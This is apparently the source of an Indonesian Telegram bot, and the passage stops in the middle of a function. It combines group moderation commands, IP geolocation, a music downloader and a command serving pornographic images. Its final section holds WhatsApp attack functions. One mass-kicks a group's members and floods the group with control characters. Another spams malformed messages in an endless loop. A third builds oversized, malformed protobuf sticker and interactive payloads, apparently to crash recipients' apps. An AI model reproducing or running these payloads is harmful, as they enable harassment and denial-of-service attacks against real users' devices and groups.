      `<blockquote>🔇 𝐌𝐔𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🔇 DI-MUTE
╰────────────
🤐 <i>User tidak bisa kirim pesan sekarang</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal mute: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔊 UNMUTE
 * ========================================================= */
bot.command("unmute", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-unmute");

  try {
    await ctx.restrictChatMember(target.id, {
      permissions: {
        can_send_messages: true,
        can_send_media_messages: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true,
      },
    });
    return ctx.reply(
      `<blockquote>🔊 𝐔𝐍𝐌𝐔𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🔊 AKTIF LAGI
╰────────────
💬 <i>User sudah bisa kirim pesan lagi</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unmute: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔒 LOCK GC
 * ========================================================= */
bot.command("lockgc", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");
  if (!(await botIsAdmin(ctx))) return ctx.reply("❌ ☇ Bot harus jadi admin dulu");

  try {
    await ctx.setChatPermissions({
      can_send_messages: false,
      can_send_media_messages: false,
      can_send_other_messages: false,
    });
    return ctx.reply(
      `<blockquote>🔒 𝐆𝐑𝐔𝐏 𝐃𝐈𝐊𝐔𝐍𝐂𝐈 🔒</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : 🔐 LOCKED
│ ⌬ Akses  : 👮‍♂️ Admin Only
│ ⌬ Pesan  : 🚫 Disabled
╰────────────
🚫 <i>Hanya admin yang bisa kirim pesan sekarang</i> 👑`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal lock: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🔓 UNLOCK GC
 * ========================================================= */
bot.command("unlockgc", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");
  if (!(await botIsAdmin(ctx))) return ctx.reply("❌ ☇ Bot harus jadi admin dulu");

  try {
    await ctx.setChatPermissions({
      can_send_messages: true,
      can_send_media_messages: true,
      can_send_other_messages: true,
      can_add_web_page_previews: true,
      can_invite_users: true,
    });
    return ctx.reply(
      `<blockquote>🔓 𝐆𝐑𝐔𝐏 𝐃𝐈𝐁𝐔𝐊𝐀 🎉</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ Status : 🔓 UNLOCKED
│ ⌬ Akses  : 👥 Semua Member
│ ⌬ Pesan  : 💬 Enabled
╰────────────
💚 <i>Semua member sudah bisa ngobrol lagi</i> 🗣️`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unlock: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  👢 KICK
 * ========================================================= */
bot.command("kick", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-kick");

  try {
    await ctx.kickChatMember(target.id);
    return ctx.reply(
      `<blockquote>👢 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐊𝐈𝐂𝐊</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👋 KICKED
╰────────────
🚪 <i>User telah dikeluarkan dari grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal kick: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🚫 BAN
 * ========================================================= */
bot.command("ban", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-ban");

  try {
    await ctx.banChatMember(target.id);
    return ctx.reply(
      `<blockquote>🚫 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐁𝐀𝐍 ⛔</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 🚫 BANNED
╰────────────
🔨 <i>User diblokir permanen dari grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal ban: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ✅ UNBAN
 * ========================================================= */
bot.command("unban", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-unban");

  try {
    await ctx.unbanChatMember(target.id);
    return ctx.reply(
      `<blockquote>✅ 𝐔𝐒𝐄𝐑 𝐃𝐈-𝐔𝐍𝐁𝐀𝐍 🔓</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: ✅ UNBANNED
╰────────────
🎉 <i>User bisa join grup lagi</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unban: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ⬆️ PROMOTE
 * ========================================================= */
bot.command("promote", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-promote");

  try {
    await ctx.promoteChatMember(target.id, {
      can_change_info: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true,
      can_pin_messages: true,
    });
    return ctx.reply(
      `<blockquote>⬆️ 𝐏𝐑𝐎𝐌𝐎𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 👑</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👑 ADMIN
╰────────────
🎊 <i>Selamat! User sekarang jadi admin</i> 🎉`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal promote: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  ⬇️ DEMOTE
 * ========================================================= */
bot.command("demote", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const target = ctx.message.reply_to_message?.from;
  if (!target) return ctx.reply("⚠️ ☇ Reply pesan user yang mau di-demote");

  try {
    await ctx.promoteChatMember(target.id, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
    });
    return ctx.reply(
      `<blockquote>⬇️ 𝐃𝐄𝐌𝐎𝐓𝐄 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒  𝑼͢𝒔͠𝒆͒𝒓͢ 〕
│ ⌬ Nama : ${target.first_name}
│ ⌬ ID   : <code>${target.id}</code>
│ ⌬ Status: 👥 MEMBER
╰────────────
😔 <i>User dicabut dari admin</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal demote: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  📢 TAGALL
 * ========================================================= */
bot.command("tagall", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    const admins = await ctx.getChatAdministrators();
    const list = admins
      .map((a, i) => `${i + 1}. 👤 <a href="tg://user?id=${a.user.id}">${a.user.first_name}</a>`)
      .join('\n');

    return ctx.reply(
      `<blockquote>📢 𝐓𝐀𝐆 𝐀𝐋𝐋 🔔</blockquote>
${list}

💬 <i>Perhatian untuk semua member!</i> 🎯`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal tagall: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  🤫 HIDETAG
 * ========================================================= */
bot.command("hidetag", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    const admins = await ctx.getChatAdministrators();
    const mentions = admins.map((a) => `<a href="tg://user?id=${a.user.id}">\u2063</a>`).join('');
    const pesan = (ctx.match || '').trim() || '📢 Perhatian semua! 👀';
    return ctx.reply(`🤫 ${pesan} ${mentions}`, { parse_mode: "HTML" });
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal hidetag: ${e.description || e.message}`);
  }
});

/* =========================================================
 *  📌 PIN / UNPIN / DEL
 * ========================================================= */
bot.command("pin", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("⚠️ ☇ Reply pesan yang mau di-pin");

  try {
    await ctx.pinChatMessage(reply.message_id);
    return ctx.reply(
      `<blockquote>📌 𝐏𝐄𝐒𝐀𝐍 𝐃𝐈-𝐏𝐈𝐍 ✅</blockquote>
╭〔 𝑰͒𝒏͢𝒇͠𝒐͒ 〕
│ ⌬ Msg ID : <code>${reply.message_id}</code>
│ ⌬ Status : PINNED
╰────────────
🔝 <i>Pesan tampil di atas grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal pin: ${e.description || e.message}`);
  }
});

bot.command("unpin", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  try {
    await ctx.unpinChatMessage();
    return ctx.reply(
      `<blockquote>📌 𝐏𝐄𝐒𝐀𝐍 𝐃𝐈-𝐔𝐍𝐏𝐈𝐍 ❌</blockquote>
🔽 <i>Pin pesan sudah dilepas dari atas grup</i>`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal unpin: ${e.description || e.message}`);
  }
});

bot.command("del", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");
  if (!(await isAdmin(ctx))) return ctx.reply("❌ ☇ Akses hanya untuk admin");

  const reply = ctx.message.reply_to_message;
  if (!reply) return ctx.reply("⚠️ ☇ Reply pesan yang mau dihapus");

  try {
    await ctx.deleteMessage(reply.message_id);
    await ctx.deleteMessage().catch(() => {});
  } catch (e) {
    return ctx.reply(`❌ ☇ Gagal hapus: ${e.description || e.message}`);
  }
});

bot.command("settings", async (ctx) => {
  if (ctx.chat.type === 'private') return ctx.reply("❌ ☇ Hanya untuk grup");

  const s = getGroupSetting(ctx.chat.id);
  return ctx.reply(
    `<blockquote>⚙️ 𝐒𝐄𝐓𝐓𝐈𝐍𝐆𝐒 𝐆𝐑𝐔𝐏 🔧</blockquote>
╭〔 𝑺͒𝒕͢𝒂͠𝒕͒𝒖͢𝒔͠ 〕
│ ⌬ 🔗 Anti-Link  : ${s.antilink ? '✅ ON' : '❌ OFF'}
│ ⌬ 🚫 Anti-Spam  : ${s.antispam ? '✅ ON' : '❌ OFF'}
│ ⌬ 👋 Welcome    : ${s.welcome ? '✅ ON' : '❌ OFF'}
│ ⌬ ⚠️ Anti-Toxic  : ${s.antitoxic ? '✅ ON' : '❌ OFF'}
╰────────────
💡 <i>Ubah setting dengan command masing-masing</i> 🔧`,
    { parse_mode: "HTML" }
  );
});

bot.on("message", async (ctx, next) => {
  try {
    if (ctx.chat.type === 'private') return next();
    const s = getGroupSetting(ctx.chat.id);
    if (!s.antilink) return next();

    const text = ctx.message.text || ctx.message.caption || '';
    const linkRegex = /(https?:\/\/|t\.me\/|wa\.me\/|telegram\.me\/)/i;

    if (linkRegex.test(text)) {
      if (await isAdmin(ctx)) return next();
      try {
        await ctx.deleteMessage();
        await ctx.reply(
          `🚫🔗 <b>LINK TERDETEKSI!</b> 🔗🚫\n\n👤 <b>User :</b> ${ctx.from.first_name}\n⚠️ <i>Link tidak diizinkan di grup ini!</i>\n🗑️ <i>Pesan otomatis dihapus</i>`,
          { parse_mode: "HTML" }
        );
      } catch {}
    }
  } catch (e) {}
  return next();
});

bot.command("shortlink", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

  if (!url) {
    return ctx.reply(
      "🔗 Send the link you want to shorten!\n\nExample:\n`/shortlink https://example.com/very/long/link`",
      { parse_mode: "Markdown" }
    );
  }

  try {
    const res = await fetch(
      `https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`
    );
    const shortUrl = await res.text();

    if (!shortUrl || !shortUrl.startsWith("http")) {
      throw new Error("Shorten failed");
    }

    await ctx.reply(
      `✅ *Link shortened!*\n\n🔹 Original: ${url}\n🔹 Short: ${shortUrl}`,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error("Shortlink error:", err);
    ctx.reply("⚠️ Failed to shorten link. Try again later.");
  }
});

bot.command("trackip", async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
⫹⫺ - IP: ${data.ip || "-"}
⫹⫺ - Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⫹⫺ - Region: ${data.region || "-"}
⫹⫺ - City: ${data.city || "-"}
⫹⫺ - ZIP: ${data.postal || "-"}
⫹⫺ - Timezone: ${data.timezone_gmt || "-"}
⫹⫺ - ISP: ${data.isp || "-"}
⫹⫺ - Org: ${data.org || "-"}
⫹⫺ - ASN: ${data.asn || "-"}
⫹⫺ - Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌜🌍⌟ ☇ オープンロケーション", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailUrl !== "undefined" && thumbnailUrl) {
        await ctx.replyWithPhoto(thumbnailUrl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 ☇ Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ ☇ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', checkPremium, async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});
const videoList = [
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/r3ip1j.mp4"},
  {"url": "https://files.catbox.moe/71l6bo.mp4"},
  {"url": "https://files.catbox.moe/rdggsh.mp4"},
  {"url": "https://files.catbox.moe/3288uf.mp4"},
  {"url": "https://files.catbox.moe/jdopgq.mp4"},
  {"url": "https://files.catbox.moe/8ca9cw.mp4"},
  {"url": "https://files.catbox.moe/b99qh3.mp4"},
  {"url": "https://files.catbox.moe/6bkokw.mp4"},
  {"url": "https://files.catbox.moe/ebisdh.mp4"},
  {"url": "https://files.catbox.moe/3yko44.mp4"},
  {"url": "https://files.catbox.moe/apqlvo.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/nk5l10.mp4"},
  {"url": "https://files.catbox.moe/8c7gz3.mp4"},
  {"url": "https://files.catbox.moe/wqe1r7.mp4"},
  {"url": "https://files.catbox.moe/n37liq.mp4"},
  {"url": "https://files.catbox.moe/0728bg.mp4"},
  {"url": "https://files.catbox.moe/p69jdc.mp4"},
  {"url": "https://files.catbox.moe/occ3en.mp4"},
  {"url": "https://files.catbox.moe/y8hmau.mp4"},
  {"url": "https://files.catbox.moe/tvj95b.mp4"},
  {"url": "https://files.catbox.moe/3g2djb.mp4"},
  {"url": "https://files.catbox.moe/xlbafn.mp4"}
  // ... tambahkan yang lain
]


bot.command("ai", async (ctx) => {
  const userId = ctx.from.id
  const query = ctx.message.text.split(" ").slice(1).join(" ")

  if (!query) {
    return ctx.reply("Contoh penggunaan:\n/ai siapa presiden indonesia")
  }

  const now = Date.now()

  // cooldown 5 detik
  if (cooldown[userId] && now - cooldown[userId] < 5000) {
    return ctx.reply("Tunggu 5 detik sebelum pakai lagi")
  }

  // cek request sebelumnya
  if (processing[userId]) {
    return ctx.reply("Tunggu, request sebelumnya masih diproses")
  }

  cooldown[userId] = now
  processing[userId] = true

  try {
    await ctx.reply("Sabar Biar Gwa Mikir Dulu...")

    let hasil = await aiPerplexity(query)

    if (hasil.length > 4000) {
      hasil = hasil.slice(0, 4000) + "..."
    }

    await ctx.reply(hasil)

  } catch (err) {
    await ctx.reply("Terjadi error: " + err.message)
  } finally {
    processing[userId] = false
  }
})

// CASE REQ FITUR + SPOTIFY + AI
const memeks = [
  "spotify",
  "ytmusic",
  "joox",
  "soundcloud",
  "deezer",
  "applemusic",
  "amazonmusic",
  "kiw",
  "audiomack",
  "resso",
  "play",
  "ytplay",
  "ytmp3",
  "song",
  "music"
]

// ambil command regex
const kwontol = new RegExp(`^\\/(${memeks.join("|")})\\s+(.+)`, "i")

async function fetchAPI(query) {
  try {
    const url = `http://api.ikyyxd.my.id/search/spotifyplay?query=${encodeURIComponent(query)}`

    const res = await axios.get(url, {
      timeout: 15000,
      validateStatus: () => true
    })

    if (res.status !== 200 || !res.data?.status) {
      return null
    }

    return res.data.result

  } catch (err) {
    console.log("API ERROR:", err.message)
    return null
  }
}

async function sendAudioSafe(ctx, data) {
  try {
    return await ctx.replyWithAudio(
      { url: data.download },
      {
        title: data.title || "Unknown",
        performer: data.artist || "Unknown",
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}
⏱ ${data.duration || "Unknown"}`
      }
    )

  } catch (err) {

    return await ctx.replyWithDocument(
      { url: data.download },
      {
        caption:
`🎵 ${data.title || "Unknown"}
👤 ${data.artist || "Unknown"}`
      }
    )
  }
}

// handler command
bot.hears(kwontol, async (ctx) => {
  try {
    const text = ctx.message.text
    const match = text.match(kwontol)

    if (!match) return

    const cmd = match[1]
    const query = match[2]

    await ctx.sendChatAction("upload_document")

    const data = await fetchAPI(query)

    if (!data || !data.download) {
      return ctx.reply(`❌ (${cmd}) Lagu tidak ditemukan`)
    }

    await sendAudioSafe(ctx, data)

  } catch (err) {
    console.log("ERROR:", err.message)
    ctx.reply("❌ Gagal kirim audio")
  }
})

// anti crash
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED:", err)
})

process.on("uncaughtException", (err) => {
  console.log("CRASH:", err)
})

const processing = {}

async function aiPerplexity(query) {
  try {
    const url = "http://api.ikyyxd.my.id/ai/perplexity?query=" + encodeURIComponent(query)
    
    const res = await axios.get(url)

    return res.data.result || JSON.stringify(res.data)
  } catch (err) {
    return "Terjadi error: " + err.message
  }
}


//FUNC AMPAS LO TARO DISIN
async function BanGroupMention(sock, target) {
  let group = target.includes("@g.us") ? target : target + "@g.us";
  let botId = sock.user.id.split(":")[0] + "@s.whatsapp.net";

  for (let i = 0; i < 20; i++) {
    try {
      const meta = await sock.groupMetadata(group);
      const participants = meta.participants || [];

      const allMentions = participants
        .filter((p) => p.id !== botId)
        .map((p) => p.id);

      if (!allMentions.length) break;

      const mentionText = allMentions
        .map((jid) => `@${jid.split("@")[0]}`)
        .join(" ");

      await sock.sendMessage(group, {
        text: mentionText,
        mentions: allMentions,
      });

      for (let m of participants) {
        if (m.id !== botId) {
          try {
            await sock.groupParticipantsUpdate(group, [m.id], "remove");
          } catch (e) {}
          await new Promise((r) => setTimeout(r, 15));
        }
      }

      await sock.sendMessage(group, {
        text:
          "\u200B".repeat(3000) +
          "\u0000".repeat(3000) +
          "\u202E".repeat(1000),
      });

      await new Promise((r) => setTimeout(r, 1000));
    } catch (e) {}
  }
}

async function CanSpam(sock, target) {
while (true) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "\0"
                        },
                        nativeFlowMessage: {
                           buttons: "\n".repeat(250000) + "\x10".repeat(250000),
                        }
                   }
                }
            }
        }, {
            participant: true
        });

        await sleep(2000);
}
}

async function xxx(sock, target) {
    const xxx = {
       stickerPackMessage: {
         url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
         fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
         fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
         mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
         mimetype: "image/webp",
         directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
         fileLength: "10610",
         mediaKeyTimestamp: "1775044724",
         stickerSentTs: "1775044724091",
         name: "\0" + "ꦾ".repeat(70000),
         publisher: "x" + "ꦾ".repeat(5000),
      }
    };
    
    const kontol = {
      interactiveMessage: {
      body: {
        text: "x" + "ꦾ".repeat(30000),
      },
      nativeFlowMessage: {
        name: "carousel_message",
        buttons: [],
        cards: Array.from({ length: 30 }, () => ({})),
      },
      contextInfo: {
        remoteJid: "@s.whatsapp.net",
        statusAttributionType: 9999,
        mentionedJid: Array.from(
          { length: 2000 },
          () => Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
        ),
      },
    },
  };
  
    const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02],
  ];

  const encodeVarint = function(n) {
    var buf = [];
    while (n >= 0x80) {
      buf.push((n & 0x7f) | 0x80);
      n >>>= 7;
    }
    buf.push(n);
    return Buffer.from(buf);
  };

  const wrapLd = function(tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
  };

  const basePayload = proto.Message.encode(
    proto.Message.fromObject({ stickerPackMessage: kontol, xxx })
  ).finish();

  const inflate = function(tag, depth) {
    var buf = basePayload;
